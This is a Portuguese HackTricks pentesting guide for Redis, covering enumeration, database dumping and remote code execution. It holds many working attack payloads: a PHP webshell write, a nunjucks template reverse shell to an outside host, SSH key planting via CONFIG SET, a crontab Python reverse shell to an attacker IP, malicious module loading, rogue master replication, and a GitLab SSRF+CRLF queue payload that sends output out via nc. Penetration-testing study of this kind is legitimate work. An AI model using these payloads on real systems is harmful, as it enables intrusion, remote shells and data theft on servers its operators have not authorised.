# 6379 - Pentesting Redis

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado atrav√©s de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Informa√ß√µes B√°sicas

De [a documenta√ß√£o](https://redis.io/topics/introduction): Redis √© um armazenamento de **estrutura de dados em mem√≥ria**, de c√≥digo aberto (licen√ßa BSD), usado como um **banco de dados**, cache e corretor de mensagens.

Por padr√£o, o Redis usa um protocolo baseado em texto simples, mas voc√™ deve ter em mente que tamb√©m pode implementar **ssl/tls**. Aprenda como [executar o Redis com ssl/tls aqui](https://fossies.org/linux/redis/TLS.md).

**Porta padr√£o:** 6379
```
PORT     STATE SERVICE  VERSION
6379/tcp open  redis   Redis key-value store 4.0.9
```
## Enumera√ß√£o Autom√°tica

Algumas ferramentas automatizadas que podem ajudar a obter informa√ß√µes de uma inst√¢ncia do redis:
```bash
nmap --script redis-info -sV -p 6379 <IP>
msf> use auxiliary/scanner/redis/redis_server
```
## Enumera√ß√£o Manual

### Banner

O Redis √© um **protocolo baseado em texto**, voc√™ pode simplesmente **enviar o comando em um socket** e os valores retornados ser√£o leg√≠veis. Lembre-se tamb√©m de que o Redis pode ser executado usando **ssl/tls** (mas isso √© muito estranho).

Em uma inst√¢ncia regular do Redis, voc√™ pode simplesmente se conectar usando `nc` ou tamb√©m pode usar `redis-cli`:
```bash
nc -vn 10.10.10.10 6379
redis-cli -h 10.10.10.10 # sudo apt-get install redis-tools
```
O **primeiro comando** que voc√™ poderia tentar √© **`info`**. Ele **pode retornar a sa√≠da com informa√ß√µes** da inst√¢ncia do Redis **ou algo** como o seguinte √© retornado:
```
-NOAUTH Authentication required.
```
Neste √∫ltimo caso, isso significa que **voc√™ precisa de credenciais v√°lidas** para acessar a inst√¢ncia do Redis.

### Autentica√ß√£o do Redis

**Por padr√£o**, o Redis pode ser acessado **sem credenciais**. No entanto, ele pode ser **configurado** para suportar **apenas senha ou nome de usu√°rio + senha**.\
√â poss√≠vel **definir uma senha** no arquivo _**redis.conf**_ com o par√¢metro `requirepass` **ou temporariamente** at√© que o servi√ßo reinicie conectando-se a ele e executando: `config set requirepass p@ss$12E45`.\
Al√©m disso, um **nome de usu√°rio** pode ser configurado no par√¢metro `masteruser` dentro do arquivo _**redis.conf**_.

{% hint style="info" %}
Se apenas a senha estiver configurada, o nome de usu√°rio usado √© "**default**".\
Al√©m disso, observe que **n√£o h√° como descobrir externamente** se o Redis foi configurado apenas com senha ou nome de usu√°rio + senha.
{% endhint %}

Em casos como este, voc√™ precisar√° **encontrar credenciais v√°lidas** para interagir com o Redis, ent√£o voc√™ poderia tentar [**for√ßa bruta**](../generic-methodologies-and-resources/brute-force.md#redis) nisso.\
**Caso encontre credenciais v√°lidas, voc√™ precisar√° autenticar a sess√£o** ap√≥s estabelecer a conex√£o com o comando:
```bash
AUTH <username> <password>
```
**Credenciais v√°lidas** ser√£o respondidas com: `+OK`

### **Enumera√ß√£o autenticada**

Se o servidor Redis permitir **conex√µes an√¥nimas** ou se voc√™ obteve credenciais v√°lidas, voc√™ pode iniciar o processo de enumera√ß√£o do servi√ßo usando os seguintes **comandos**:
```bash
INFO
[ ... Redis response with info ... ]
client list
[ ... Redis response with connected clients ... ]
CONFIG GET *
[ ... Get config ... ]
```
**Outros comandos do Redis** [**podem ser encontrados aqui**](https://redis.io/topics/data-types-intro) **e** [**aqui**](https://lzone.de/cheat-sheet/Redis)**.**

Note que os **comandos do Redis de uma inst√¢ncia podem ser renomeados** ou removidos no arquivo _redis.conf_. Por exemplo, esta linha remover√° o comando FLUSHDB:
```
rename-command FLUSHDB ""
```
Mais sobre a configura√ß√£o segura de um servi√ßo Redis aqui: [https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04](https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04)

Voc√™ tamb√©m pode **monitorar em tempo real os comandos Redis** executados com o comando **`monitor`** ou obter os **25 queries mais lentos** com **`slowlog get 25`**

Encontre mais informa√ß√µes interessantes sobre outros comandos Redis aqui: [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)

### **Despejando Banco de Dados**

Dentro do Redis, os **bancos de dados s√£o n√∫meros que come√ßam a partir de 0**. Voc√™ pode verificar se algum est√° sendo usado na sa√≠da do comando `info` dentro do bloco "Keyspace":

![](<../.gitbook/assets/image (766).png>)

Ou voc√™ pode simplesmente obter todos os **keyspaces** (bancos de dados) com:
```
INFO keyspace
```
Nesse exemplo, o **banco de dados 0 e 1** est√£o sendo usados. **O banco de dados 0 cont√©m 4 chaves e o banco de dados 1 cont√©m 1**. Por padr√£o, o Redis usar√° o banco de dados 0. Para fazer o dump, por exemplo, do banco de dados 1, voc√™ precisa fazer:
```bash
SELECT 1
[ ... Indicate the database ... ]
KEYS *
[ ... Get Keys ... ]
GET <KEY>
[ ... Get Key ... ]
```
No caso de receber o seguinte erro `-WRONGTYPE Opera√ß√£o contra uma chave que cont√©m um tipo de valor incorreto` ao executar `GET <KEY>`, √© porque a chave pode ser algo diferente de uma string ou um inteiro e requer um operador especial para exibi-la.

Para saber o tipo da chave, use o comando `TYPE`, exemplo abaixo para chaves do tipo lista e hash.
```bash
TYPE <KEY>
[ ... Type of the Key ... ]
LRANGE <KEY> 0 -1
[ ... Get list items ... ]
HGET <KEY> <FIELD>
[ ... Get hash item ... ]

# If the type used is weird you can always do:
DUMP <key>
```
**Despeje o banco de dados com npm** [**redis-dump**](https://www.npmjs.com/package/redis-dump) **ou python** [**redis-utils**](https://pypi.org/project/redis-utils/)

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao servidor [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Envolver-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Redis RCE

### Shell Interativo

[**redis-rogue-server**](https://github.com/n0b0dyCN/redis-rogue-server) pode automaticamente obter um shell interativo ou um shell reverso no Redis (<=5.0.5).
```
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ACCACKER_IP>
```
### PHP Webshell

Informa√ß√µes de [**aqui**](https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html). Voc√™ deve saber o **caminho** da **pasta do site**:
```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```
Se a exce√ß√£o de acesso ao webshell, voc√™ pode esvaziar o banco de dados ap√≥s o backup e tentar novamente, lembre-se de restaurar o banco de dados.

### Modelo Webshell

Assim como na se√ß√£o anterior, voc√™ tamb√©m pode sobrescrever algum arquivo de modelo html que ser√° interpretado por um mecanismo de modelo e obter um shell.

Por exemplo, seguindo [**este artigo**](https://www.neteye-blog.com/2022/05/cyber-apocalypse-ctf-2022-red-island-writeup/), voc√™ pode ver que o atacante injetou um **shell reverso em um html** interpretado pelo **mecanismo de modelo nunjucks:**
```javascript
{{ ({}).constructor.constructor(
"var net = global.process.mainModule.require('net'),
cp = global.process.mainModule.require('child_process'),
sh = cp.spawn('sh', []);
var client = new net.Socket();
client.connect(1234, 'my-server.com', function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});"
)()}}
```
{% hint style="warning" %}
Note que **v√°rios motores de template armazenam em cache** os templates na **mem√≥ria**, ent√£o mesmo que voc√™ os sobrescreva, o novo **n√£o ser√° executado**. Nesses casos, ou o desenvolvedor deixou a recarga autom√°tica ativa ou voc√™ precisa fazer um DoS sobre o servi√ßo (e esperar que ele seja reiniciado automaticamente).
{% endhint %}

### SSH

Exemplo [daqui](https://blog.adithyanak.com/oscp-preparation-guide/enumeration)

Por favor, esteja ciente de que o resultado de **`config get dir`** pode ser alterado ap√≥s outros comandos de explora√ß√£o manual. Sugiro execut√°-lo primeiro logo ap√≥s fazer login no Redis. No resultado de **`config get dir`** voc√™ pode encontrar o **diret√≥rio home** do **usu√°rio redis** (geralmente _/var/lib/redis_ ou _/home/redis/.ssh_), e sabendo disso voc√™ sabe onde pode escrever o arquivo `authenticated_users` para acessar via ssh **com o usu√°rio redis**. Se voc√™ souber o diret√≥rio home de outro usu√°rio v√°lido onde voc√™ tem permiss√µes de escrita, voc√™ tamb√©m pode abusar disso:

1. Gere um par de chaves p√∫blica-privada ssh no seu computador: **`ssh-keygen -t rsa`**
2. Escreva a chave p√∫blica em um arquivo: **`(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt`**
3. Importe o arquivo para o redis: **`cat spaced_key.txt | redis-cli -h 10.85.0.52 -x set ssh_key`**
4. Salve a chave p√∫blica no arquivo **authorized\_keys** no servidor redis:

```
root@Urahara:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> config set dir /var/lib/redis/.ssh
OK
10.85.0.52:6379> config set dbfilename "authorized_keys"
OK
10.85.0.52:6379> save
OK
```
5. Por fim, voc√™ pode fazer **ssh** para o **servidor redis** com a chave privada: **ssh -i id\_rsa redis@10.85.0.52**

**Essa t√©cnica est√° automatizada aqui:** [https://github.com/Avinash-acid/Redis-Server-Exploit](https://github.com/Avinash-acid/Redis-Server-Exploit)

### Crontab
```
root@Urahara:~# echo -e "\n\n*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.85.0.53\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n"|redis-cli -h 10.85.0.52 -x set 1
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dir /var/spool/cron/crontabs/
OK
root@Urahara:~# redis-cli -h 10.85.0.52 config set dbfilename root
OK
root@Urahara:~# redis-cli -h 10.85.0.52 save
OK
```
O √∫ltimo exemplo √© para o Ubuntu, para o **Centos**, o comando acima deve ser: `redis-cli -h 10.85.0.52 config set dir /var/spool/cron/`

Este m√©todo tamb√©m pode ser usado para ganhar bitcoin: [yam](https://www.v2ex.com/t/286981#reply14)

### Carregar M√≥dulo Redis

1. Seguindo as instru√ß√µes de [https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand) voc√™ pode **compilar um m√≥dulo redis para executar comandos arbitr√°rios**.
2. Em seguida, voc√™ precisa de alguma forma de **fazer upload do m√≥dulo compilado**
3. **Carregue o m√≥dulo** carregado em tempo de execu√ß√£o com `MODULE LOAD /caminho/para/mymodule.so`
4. **Liste os m√≥dulos carregados** para verificar se foi carregado corretamente: `MODULE LIST`
5. **Execute comandos**:

```
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```
6. Descarregue o m√≥dulo quando desejar: `MODULE UNLOAD mymodule`

### Bypass de Sandbox LUA

[**Aqui**](https://www.agarri.fr/blog/archives/2014/09/11/trying\_to\_hack\_redis\_via\_http\_requests/index.html) voc√™ pode ver que o Redis usa o comando **EVAL** para executar **c√≥digo Lua em sandbox**. No post vinculado, voc√™ pode ver **como abusar disso** usando a fun√ß√£o **dofile**, mas [aparentemente](https://stackoverflow.com/questions/43502696/redis-cli-code-execution-using-eval) isso n√£o √© mais poss√≠vel. De qualquer forma, se voc√™ puder **burlar o sandbox** Lua, poder√° **executar comandos arbitr√°rios** no sistema. Al√©m disso, no mesmo post, voc√™ pode ver algumas **op√ß√µes para causar DoS**.

Alguns **CVEs para escapar do LUA**:

* [https://github.com/aodsec/CVE-2022-0543](https://github.com/aodsec/CVE-2022-0543)

### M√≥dulo Mestre-Escravo

‚ÄãTodas as opera√ß√µes no redis mestre s√£o automaticamente sincronizadas com o redis escravo, o que significa que podemos considerar a vulnerabilidade do redis como um redis escravo, conectado ao redis mestre que controlamos, ent√£o podemos inserir o comando no nosso pr√≥prio redis.
```
master redis : 10.85.0.51 (Hacker's Server)
slave  redis : 10.85.0.52 (Target Vulnerability Server)
A master-slave connection will be established from the slave redis and the master redis:
redis-cli -h 10.85.0.52 -p 6379
slaveof 10.85.0.51 6379
Then you can login to the master redis to control the slave redis:
redis-cli -h 10.85.0.51 -p 6379
set mykey hello
set mykey2 helloworld
```
## SSRF falando com o Redis

Se voc√™ pode enviar uma solicita√ß√£o em **texto claro para o Redis**, voc√™ pode **comunicar com ele**, pois o Redis ler√° linha por linha a solicita√ß√£o e simplesmente responder√° com erros √†s linhas que n√£o entender:
```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```
Portanto, se voc√™ encontrar uma **vulnerabilidade SSRF** em um site e puder **controlar** alguns **cabe√ßalhos** (talvez com uma vulnerabilidade CRLF) ou **par√¢metros POST**, voc√™ poder√° enviar comandos arbitr√°rios para o Redis.

### Exemplo: Gitlab SSRF + CRLF para Shell

No **Gitlab11.4.7** foram descobertas uma **vulnerabilidade SSRF** e uma **CRLF**. A **vulnerabilidade SSRF** estava na **funcionalidade de importa√ß√£o de projeto a partir de URL** ao criar um novo projeto e permitia acessar IPs arbitr√°rios no formato \[0:0:0:0:0:ffff:127.0.0.1] (isso acessar√° 127.0.0.1), e a **vulnerabilidade CRLF** foi explorada apenas **adicionando os caracteres %0D%0A** √† **URL**.

Portanto, foi poss√≠vel **abusar dessas vulnerabilidades para se comunicar com a inst√¢ncia do Redis** que **gerencia filas** do **gitlab** e abusar dessas filas para **obter execu√ß√£o de c√≥digo**. O payload de abuso da fila do Redis √©:
```
multi
sadd resque:gitlab:queues system_hook_push
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
exec
```
E a solicita√ß√£o de **codifica√ß√£o de URL** abusando do **SSRF** e **CRLF** para executar um `whoami` e enviar a sa√≠da via `nc` √©:
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0D%0A%20multi%0D%0A%20sadd%20resque%3Agitlab%3Aqueues%20system%5Fhook%5Fpush%0D%0A%20lpush%20resque%3Agitlab%3Aqueue%3Asystem%5Fhook%5Fpush%20%22%7B%5C%22class%5C%22%3A%5C%22GitlabShellWorker%5C%22%2C%5C%22args%5C%22%3A%5B%5C%22class%5Feval%5C%22%2C%5C%22open%28%5C%27%7Ccat%20%2Fflag%20%7C%20nc%20127%2E0%2E0%2E1%202222%5C%27%29%2Eread%5C%22%5D%2C%5C%22retry%5C%22%3A3%2C%5C%22queue%5C%22%3A%5C%22system%5Fhook%5Fpush%5C%22%2C%5C%22jid%5C%22%3A%5C%22ad52abc5641173e217eb2e52%5C%22%2C%5C%22created%5Fat%5C%22%3A1513714403%2E8122594%2C%5C%22enqueued%5Fat%5C%22%3A1513714403%2E8129568%7D%22%0D%0A%20exec%0D%0A%20exec%0D%0A/ssrf123321.git
```
_Por alguma raz√£o (como para o autor de_ [_https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/_](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/) _de onde essa informa√ß√£o foi retirada), a explora√ß√£o funcionou com o esquema `git` e n√£o com o esquema `http`._

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server para se comunicar com hackers experientes e ca√ßadores de recompensas por bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que mergulha na emo√ß√£o e desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais recentes programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking AWS de zero a her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
